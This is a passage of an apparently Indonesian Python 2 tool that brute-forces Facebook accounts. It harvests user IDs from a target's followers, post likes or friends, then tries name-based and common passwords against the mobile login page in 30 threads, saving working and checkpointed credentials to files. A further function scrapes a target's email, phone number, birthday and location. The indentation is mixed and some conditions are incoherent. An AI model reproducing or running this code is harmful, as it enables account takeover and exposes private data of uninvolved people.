					print('\r  \033[0;92mOK--> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  CP--> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93mCP--> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  CP--> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93mCP--> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  CP--> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def followers():
	global token,ua_kk,ua_lu
#	global token,ua_lu
	try:
		ua_mmk = open('.ua.txt', 'r').read()
		ua_lu = open('.ua', 'r').read()
	except IOError:
		set_ua()
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Followers")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96mCP\033[0;97m]%sHasil OK DiSimpan Di : %s results/OK-%s-%s-%s.txt"% (c, k, ha, op, ta))
	print(" \033[0;97m[\033[0;96mCP\033[0;97m]%sHasil CP DiSimpan Di : %s results/CP-%s-%s-%s.txt"% (c, k, ha, op, ta))
	jalan(w+" Matikan Data Internet Anda Jika Mau Jeda/Pause")
	jalan(c+" Version User Agent : "+k+ua_lu)
#
#	print(" \033[0;97m[\033[0;96mOK\033[0;97m]"+p+"Hasil OK DiSimoan Di : "+c+"results/OK-%s-%s-%s.txt"% (ha, op, ta))
#	print(" \033[0;97m[\033[0;96mCP\033[0;97m]"+p+"Hasil CP DiSimoan Di : "+c+"results/OK-%s-%s-%s.txt"% (ha, op, ta))
##	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
#	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		stdout.write(
		      ' \r\033[0;97m[%s%s\033[0;97m]Cracking %s%s/%s [ %sOK-:%s%s ] -- [ %sCP-:%s%s ]               \r'%(w,datetime.now().strftime('%H:%M:%S'), w, loop, len(id), I, len(ok), q, K, len(cp), q
		));stdout.flush()
#		sys.stdout.write(
#		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
#		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s %s[ %sSukses--> %s %s] - %s[ %sCheck--> %s %s]' % (rgb,loop, len(id), c, i, len(ok), c, c, k, len(cp), c)
#		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
					pwx.append("bismilah")
					pwx.append("sayang")
					pwx.append("sayang123")
					pwx.append("sayang1234")
					pwx.append("kontol")
					pwx.append("kontol123")
					pwx.append("babi1234")
					pwx.append("pepek123")
					pwx.append("anjing123")
                                        pwx.append("rahasia")
                                        pwx.append("bajingan")
				else:
                                        pwx.append(ss+"321")
                                        pwx.append(ss+"54321")
                                        pwx.append(ss+"654321")
                                        pwx.append(ss+"gtg")
                                        pwx.append(ss+"ganteng")
                                        pwx.append(ss+"123321")
                                        pwx.append("bismillah")
                                        pwx.append("banjingan321")
                                        pwx.append("indonesia")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92mOK--> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  OK--> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93mCP--> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  CP--> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93mCP--> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  CP--> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def reaction():
	global token,ua_kk,ua_lu
#	global token,ua_lu
	try:
		ua_mmk = open('.ua.txt', 'r').read()
		ua_lu = open('.ua', 'r').read()
	except IOError:
		set_ua()
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96mCP\033[0;97m]%sHasil OK DiSimpan Di : %s results/OK-%s-%s-%s.txt"% (c, k, ha, op, ta))
	print(" \033[0;97m[\033[0;96mCP\033[0;97m]%sHasil CP DiSimpan Di : %s results/CP-%s-%s-%s.txt"% (c, k, ha, op, ta))
	jalan(w+" Matikan Data Internet Anda Jika Mau Jeda/Pause")
	jalan(c+" Version User Agent : "+k+ua_lu)

#	print(" \033[0;97m[\033[0;96mOK\033[0;97m]"+p+"Hasil OK DiSimoan Di : "+c+"results/OK-%s-%s-%s.txt"% (ha, op, ta))
#	print(" \033[0;97m[\033[0;96mCP\033[0;97m]"+p+"Hasil CP DiSimoan Di : "+c+"results/OK-%s-%s-%s.txt"% (ha, op, ta))
#	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
#	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		stdout.write(
		      ' \r\033[0;97m[%s%s\033[0;97m]Cracking %s%s/%s [ %sOK-:%s%s ] -- [ %sCP-:%s%s ]              \r'%(w,datetime.now().strftime('%H:%M:%S'), w, loop, len(id), I, len(ok), q, K, len(cp), q
		));stdout.flush()
#
#		sys.stdout.write(' \r\033[0;97m[%s%s\033[0;97m]Cracking %s%s/%s [ %sOK-:%s ] -- [ %sCP-:%s ]  '%(w,datetime.now().strftime('%H:%M:%S'), w, loop, len(id), i, len(ok), k, len(cp)
#		)); sys.stdout.flush()
#		sys.stdout.write(
#		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
#		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
					pwx.append("bismilah")
					pwx.append("sayang")
					pwx.append("sayang123")
					pwx.append("sayang1234")
					pwx.append("kontol")
					pwx.append("kontol123")
					pwx.append("babi1234")
					pwx.append("pepek123")
					pwx.append("anjing123")
                                        pwx.append("rahasia")
                                        pwx.append("bajingan")
				else:
                                        pwx.append(ss+"321")
                                        pwx.append(ss+"54321")
                                        pwx.append(ss+"654321")
                                        pwx.append(ss+"gtg")
                                        pwx.append(ss+"ganteng")
                                        pwx.append(ss+"123321")
                                        pwx.append("bismillah")
                                        pwx.append("banjingan321")
                                        pwx.append("indonesia")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92mOK--> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  OK--> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93mCP--> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  CP--> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93mCP--> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  CP-->'+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def manual():
	global ua_lu
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,indonesia")
	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Set Password : ")
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
	if len(pw) ==0:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Don't Be Empty")
	print(" \033[0;97m[\033[0;96mCP\033[0;97m]%sHasil OK DiSimpan Di : %s results/OK-%s-%s-%s.txt"% (c, k, ha, op, ta))
	print(" \033[0;97m[\033[0;96mCP\033[0;97m]%sHasil CP DiSimpan Di : %s results/CP-%s-%s-%s.txt"% (c, k, ha, op, ta))
	jalan(w+" Matikan Data Internet Anda Jika Mau Jeda/Pause")
	jalan(c+" Version User Agent : "+k+ua_lu)

#
#	print(" \033[0;97m[\033[0;96mOK\033[0;97m]"+p+"Hasil OK DiSimoan Di : "+c+"results/OK-%s-%s-%s.txt"% (ha, op, ta))
#	print(" \033[0;97m[\033[0;96mCP\033[0;97m]"+p+"Hasil CP DiSimoan Di : "+c+"results/OK-%s-%s-%s.txt"% (ha, op, ta))
#
#	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
#	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		stdout.write(
		      ' \r\033[0;97m[%s%s\033[0;97m]Cracking %s%s/%s [ %sOK-:%s%s ] -- [ %sCP-:%s%s ]             \r'%(w,datetime.now().strftime('%H:%M:%S'), w, loop, len(id), I, len(ok), q, K, len(cp), q
		));stdout.flush()
#
#		sys.stdout.write(' \r\033[0;97m[%s%s\033[0;97m]Cracking %s%s/%s [ %sOK-:%s ] -- [ %sCP-:%s ]  '%(w,datetime.now().strftime('%H:%M:%S'), w, loop, len(id), c, len(ok), k, len(cp)
#		)); sys.stdout.flush()
#		sys.stdout.write('\r \033[0;97m[\033[0;93m*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
#		); sys.stdout.flush()
		uid,name=user.split("<=>")
		ss = name.split(" ")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw.split(","):
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92mOK--> ' +uid+ '|' + asu + '       ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  OK-->'+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r  \033[0;93mCP--> ' +uid+ '|' + asu + '|' + ttl)
						cp.append(uid+'|'+asu+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  CP--> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93mCP--> ' +uid+ '|' + asu + '       ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  CP--> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
	
### SETTING UA
def settua():
	set_ua()
	menu()
def settua1():
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Change User Agent? [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
			print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type In Chrome Search : My User Agent")
			ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] User Agent : ") 
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print(" \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	elif ask == "t" or ask == "T":
		try:
			ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print("\n \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	else:
		menu()

def cek_ingfo():
    try:
        __cindy__= open('login.txt', 'r').read()
    except (KeyError, IOError):
        print(p+'\n Token Facebook Erorr !!')
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    try:
#	print(p+"Silahkan Ketik : "+i+"User"+p+"Untuk Tutorial Cara Ambil ID Facebook !!");time.sleep(2)
        ajg = raw_input(c+'\n ['+p+'?'+c+']'+p+'Masukkan ID Target :'+k+' ')
        if ajg in ('user', 'User', 'USER'):
        	print(p+"Anda Akan DiHarahkan KeBrowsing :)")
        	os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
        	cek_ingfo()
    except (KeyError, IOError):
	cek_ingfo()
    try:
        otw = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ajg, __cindy__))
	a = json.loads(otw.text)
        otww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ajg, __cindy__))
	x = json.loads(otww.text)
	nama = a['name']
	namade = a['first_name']
    	namabe = x['last_name']
    	idfb = x['id']
    	user = x['username']
    	ttll = x['birthday']
    	tzim = x['timezone']
    	stas = x['relationship_status']
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    	tigl = x['location']['name']
    	dari = x['hometown']['name']
    	lins = x['link']
    	uptd = x['updated_time']
    	nmrr = x['mobile_phone']
    	emai = x['email']
    	bioo = x['about']
	gndr = x['gender']
    except (KeyError, IOError):
	nama = M+"—"+c
	namade= M+"—"+c
	namabe= M+"—"+c
	idfb = M+"—"+c
	user = M+"—"+c
	ttll = M+"—"+c
	tzim = M+"—"+c
	stas = M+"—"+c
	dgn = M+"—"+c
	tigl = M+"—"+c
	dari = M+"—"+c
	lins = M+"—"+c
	uptd = M+"—"+c
	nmrr = M+"—"+c
	emai = M+"—"+c
    	bioo = M+"—"+c
    	gndr = M+'—'+c
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(ajg, __cindy__))
        z = json.loads(r.text)
        for i in z['data']:
        	uid = i['id']
        	na = i['name']
        	nm = na.rsplit(' ')[0]
        	id.append(uid + '|' + nm)
    except: pass
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(ajg, __cindy__))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    except: pass
    print '\n  '+p+'Informasih Akun Facebook';time.sleep(0.03)
    print c+' ['+m+'!'+c+']'+p+'Nama Lengkap     : %s'%(nama);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Nama Depan       : '+namade+'';time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Nama Belakang    : %s'%(namabe);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'ID Facebook      : %s'%(idfb);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Username Facebook: %s'%(user);time.sleep(0.03)
    print '\n  '+b+'* '+p+'Data-Data Akun Facebook '+b+'*\n';time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Gmail Facebook   : %s'%(emai);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Nomor Telepons   : %s'%(nmrr);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Tanggal Lahir    : %s'%(ttll);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Jenis Kelamin    : %s'%(gndr);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Jumlah Teman     : %s'% str(len(id));time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Jumlah Followers : %s'%(pengikut);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Link Facebook    : %s'%(lins);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Status Hubungan  : %s %s'%(stas,dgn);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Tentang Status   : %s'%(bioo);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Kota Asal        : %s'%(dari);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Tinggal          : %s'%(tigl);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Zona Waktu       : %s'%(tzim);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Terahir DiUpdate : %s'%(uptd);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'------------------------------------------------'+b+'⟩⟩'
    time.sleep(3)
    print(p+"Author : Yayan-XD")
    print(p+"Compose Words : Mr.Risky")
    time.sleep(2)
    print("Successfully Checking Target Information !!")
    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
    menu()






login()
bot_komen()
#	__Cek___()

